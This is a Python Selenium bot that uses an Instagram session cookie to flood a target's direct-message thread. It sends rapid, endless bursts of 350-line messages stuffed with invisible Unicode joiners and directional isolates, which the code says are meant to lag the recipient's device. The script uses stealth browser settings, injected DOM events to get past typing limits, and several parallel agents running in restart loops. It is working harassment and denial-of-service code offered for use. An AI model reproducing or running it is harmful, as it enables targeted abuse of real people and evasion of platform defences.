# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (BYPASS-V47)
# 📅 STATUS: ZERO-LAG-SENDING | 4-AGENT TOTAL | AWS-CPU-STRIKE

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.2, 0.4)    # 🛡️ Tuned for maximum server stability
REST_AFTER_STRIKES = 100   
REST_DURATION = 5          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_bypass_payload():
    """Generates a visible, high-impact block that bypasses local rendering lag."""
    u_id = random.randint(100, 999)
    # \u2060 = Word Joiner (Invisible glue)
    # \u2068 = Directional Isolate (Forces CPU recalculation)
    glue, iso, pop = "\u2060", "\u2068", "\u2069"
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [ATOMIC_LOCK:{u_id}]"
    
    body = []
    # 350 lines - Optimized for high-speed transmission
    for i in range(350):
        # We sandwich the branding between invisible directional shifts
        # This keeps the text visible but makes the 'Logic' of the line heavy
        line = f"{iso}PRAVEER PAPA ON TOP 🌙 {i}{pop}{glue*15}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9995]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        # 🛡️ CRITICAL: Disable all visual rendering for YOUR bot to prevent lag
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def bypass_send(driver, text):
    """Bypasses the 'Typing' hang by force-triggering the socket event."""
    try:
        # This script 'Nukes' the input box and fires the ENTER event immediately
        # It uses the Native DOM 'Input' event to trick Instagram into thinking the user typed instantly.
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                // 1. Clear current state
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                // 2. Inject payload
                document.execCommand('insertText', false, arguments[0]);
                // 3. Trigger React/Angular internal state update
                box.dispatchEvent(new Event('input', { bubbles: true }));
                // 4. Force Enter key event
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        driver = get_driver(agent_id)
        try:
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) # Wait for DOM to stabilize
            
            strike_count = 0
            while True:
                payload = get_bypass_payload()
                if bypass_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Atomic Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 50 == 0:
                        # Reset memory before local lag kicks in
                        driver.refresh()
                        time.sleep(8)
                
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
